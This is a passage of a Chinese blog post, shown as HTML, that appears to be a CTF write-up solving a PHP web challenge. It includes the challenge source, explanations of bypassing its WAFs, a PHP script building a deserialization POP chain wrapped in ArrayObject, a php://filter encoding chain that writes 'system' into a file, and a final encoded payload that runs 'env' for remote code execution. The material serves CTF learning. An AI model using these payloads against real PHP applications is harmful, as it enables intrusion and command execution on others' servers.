class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;开胃小菜，就让我成为签到题叭&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;WAF,启动！&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;被waf啦&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码挺长的</p>
+<p>反序列化利用点很明显，就是Chu0_write的toString方法</p>
+<p>先看waf</p>
+<p><strong>waf1:</strong></p>
+<p>传的参数是$_REQUEST全局变量</p>
+<p>$_REQUEST有个特性，当GET和POST有相同的变量时，匹配POST的变量，那么就可以同时传参GET和POST即可绕过</p>
+<p><strong>waf2:</strong></p>
+<p>匹配show字符串</p>
+<p>后面我们传链子的时候直接进行url编码就行了</p>
+<p><strong>waf3:</strong><br />
+<code>preg_match('/^[Oa]:[\d]/i',$_GET['show_show.show'])</code></p>
+<p>不能以O:d或者a:d开头</p>
+<p>直接在前面加一个**+<strong>号或者使用</strong>C**进行绕过即可</p>
+<p>然后构造链子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf::destruct-&gt;show::call-&gt;Chu0_write::toString</span><br></pre></td></tr></table></figure>
+<p>这里还需要处理的有两个地方：<br />
+<strong>1.绕过wakeup方法：</strong><br />
+php版本5.5.9，绕过wakeup抛出异常的方法有CVE-2016-7124，因为反序列化的结果没赋值给变量，这里用不了fast_destruct</p>
+<p>但如果上面我们在绕waf3时用C来绕，那也能把wakeup绕过</p>
+<p><strong>2.对<code>$args[0][0][2]</code>的赋值</strong></p>
+<p>这里需要<code>preg_match('/ctf/i',$args[0][0][2])</code>来触发Chu0_write的toString</p>
+<p>不能这样赋值<code>$a-&gt;h2[0][0][2]=new Chu0_write()</code>，本地打印出来的结果为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[h2] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="number">2</span>] =&gt; Chu0_write <span class="title function_ invoke__">Object</span></span><br><span class="line">                                (</span><br><span class="line">                                    [chu0] =&gt; </span><br><span class="line">                                    [chu1] =&gt; </span><br><span class="line">                                    [cmd] =&gt; </span><br><span class="line">                                )</span><br><span class="line">                        )</span><br><span class="line">                )</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
+<p>乍一看是三维数组，但是因为<code>__call($name,$args)</code>中的$args已经是一个数组,所以h2只需要是二维数组即可</p>
+<p>正确的写法如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Chu0_write</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h2 = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
+<p>打印的结果是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[h2] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; </span><br><span class="line">                    [<span class="number">1</span>] =&gt; </span><br><span class="line">                    [<span class="number">2</span>] =&gt; Chu0_write <span class="title function_ invoke__">Object</span></span><br><span class="line">                        (</span><br><span class="line">                            [chu0] =&gt; </span><br><span class="line">                            [chu1] =&gt; </span><br><span class="line">                            [cmd] =&gt; </span><br><span class="line">                        )</span><br><span class="line">                )</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
+<p>即二维数组</p>
+<p>exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chu0_write</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h1 = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Chu0_write</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;chu1 = &amp;<span class="variable">$b</span>-&gt;chu0;</span><br><span class="line"><span class="variable">$a</span>-&gt;h2 = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>));	<span class="comment">// 等价于$a-&gt;h2=[[2=&gt;new Chu0_write()]]</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
+<p>然后就是处理rce的时候了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_in_waf_php</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$count</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$a</span>,<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hinthinthint,base64喔&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$count</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ucs-2|phar|data|input|zip|flag|\%/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;ctfshowshowshowwww&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;chu0&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">waf_in_waf_php</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;.txt&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;绕一下吧孩子&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="variable">$tmp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;ctfw.txt&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$tmp</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="variable">$tmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;ctfw.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>稍微审一下，可以知道如果要命令执行的话就要控制<code>$tmp</code>的内容，而$tmp的内容需要写文件得到，文件名和内容是我们可控的</p>
+<p>不过这个文件的内容开头写了ctfshowshowshowwww，很明显这样子是不能作为命令执行的</p>
+<p>这个时候就要用到<a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/11/24/FilterChain/">filterchain</a>，和绕过死亡代码一样的方式通过base64去杂实现</p>
+<p>waf里面要求只能出现一次base64，还ban掉了其它的伪协议和ucs-2编码</p>
+<p>总之我们先测试一下限制一次base64解码的情况下能整出什么</p>
+<p><img src="../images/20250624175700714.png" alt="image-20250624175700714" /></p>
+<p>前面多出来的字符串编码后再解码出现了r、0这两个属于码表的字符，所以我们为了剔除这两个字符，需要构造过滤器组合使r和0变成非码表字符，最后被base64去杂</p>
+<p>官方wp用的是utf-8，utf-16le，quoted-printable编码</p>
+<p>测试一下：</p>
+<p><img src="../images/20250624175729666.png" alt="image-20250624175729666" /></p>
+<p>去杂成功</p>
+<p>那么反过来生成我们要拼接的文件内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;utf-16le&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">quoted_printable_encode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//quoted_printable_encode用于填充空字节，因为utf-8转utf-16le会产生空字节，file_put_contents会对空字节报错</span></span><br></pre></td></tr></table></figure>
+<p>所以这一部分的payload就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET：name=php:<span class="comment">//filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw</span></span><br><span class="line"></span><br><span class="line">POST：chu0=c=<span class="number">003</span>=<span class="number">00</span>l=<span class="number">00</span>z=<span class="number">00</span>d=<span class="number">00</span>G=<span class="number">00</span>V=<span class="number">00</span>t=<span class="number">00</span></span><br></pre></td></tr></table></figure>
+<h4 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="variable">$tmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
+<p>最后命令执行直接env看环境变量就行</p>
+<p>如果不在环境变量的话，可以用<code>show_source</code>配合<code>chr()</code>读文件，注意show依旧要url编码</p>
+<p>结合上面所有的trick，最终的payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET：?%<span class="number">73</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">77</span>[%<span class="number">73</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">77</span>.%<span class="number">73</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">77</span>=%<span class="number">43</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">31</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">41</span>%<span class="number">72</span>%<span class="number">72</span>%<span class="number">61</span>%<span class="number">79</span>%<span class="number">4</span>f%<span class="number">62</span>%<span class="number">6</span>a%<span class="number">65</span>%<span class="number">63</span>%<span class="number">74</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">78</span>%<span class="number">3</span>a%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>b%<span class="number">4</span>f%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">63</span>%<span class="number">74</span>%<span class="number">66</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">68</span>%<span class="number">31</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">4</span>f%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">77</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">7</span>d%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">68</span>%<span class="number">32</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>b%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">3</span>b%<span class="number">4</span>f%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">30</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">43</span>%<span class="number">68</span>%<span class="number">75</span>%<span class="number">30</span>%<span class="number">5</span>f%<span class="number">77</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">75</span>%<span class="number">30</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">4</span>e%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">75</span>%<span class="number">31</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">52</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">30</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">63</span>%<span class="number">6</span>d%<span class="number">64</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">4</span>e%<span class="number">3</span>b%<span class="number">7</span>d%<span class="number">7</span>d%<span class="number">7</span>d%<span class="number">7</span>d%<span class="number">3</span>b%<span class="number">6</span>d%<span class="number">3</span>a%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">7</span>d%<span class="number">7</span>d&amp;name=php:<span class="comment">//filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw&amp;chu0=c=003=00l=00z=00d=00G=00V=00t=00&amp;cmd=env</span></span><br><span class="line">                  </span><br><span class="line">POST：show[show.show=<span class="number">1</span>&amp;name=<span class="number">1</span>&amp;chu0=<span class="number">1</span>&amp;cmd=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250624175820046.png" alt="image-20250624175820046" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">session文件包含</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">裸文件包含</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/126839103p0master1200.jpg" data-sizes="auto" alt="Java学习" class="lazyload">
+          
+        
+        <a href="/2025/07/11/Java%E5%AD%A6%E4%B9%A0/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            Java学习
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/background-2.jpg" data-sizes="auto" alt="DASCTF系列" class="lazyload">
+        
+      
+      <a href="/2025/06/20/DASCTF%E7%B3%BB%E5%88%97/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          DASCTF系列
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy_include-session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABpearcmd"><span class="toc-number">1.1.</span> <span class="toc-text"> easy_include （session文件包含&#x2F;pearcmd）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-sessoin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 法一 sessoin文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-pearcmdphp%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 法二 pearcmd.php本地文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy_webphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text"> easy_web（php反序列化+命令执行）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 命令执行</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
